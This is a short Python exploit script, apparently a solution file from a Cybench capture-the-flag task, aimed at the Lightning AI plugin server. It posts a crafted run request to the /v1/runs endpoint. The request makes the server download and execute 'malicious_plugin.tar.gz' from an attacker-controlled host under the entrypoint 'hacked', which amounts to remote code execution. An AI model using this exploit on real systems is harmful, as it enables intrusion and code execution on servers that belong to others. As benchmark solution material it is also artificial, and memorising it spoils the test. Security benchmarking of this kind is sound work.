from lightning.app.plugin.plugin import _Run
import requests

localhost = "cybench-ci"
body = _Run(
    plugin_entrypoint="hacked",
    source_code_url=f"http://{localhost}:8000/malicious_plugin.tar.gz",
    project_id="any",
    cloudspace_id="any",
    cluster_id="any",
    plugin_arguments={},
    source_app="any",
    keep_machines_after_stop=False,
)
# responses=requests.post('http://localhost:8888/v1/runs', json=body.dict(exclude_none=True))
responses=requests.post('http://lightning-plugin:8888/v1/runs', json=body.dict(exclude_none=True))

print(responses.content)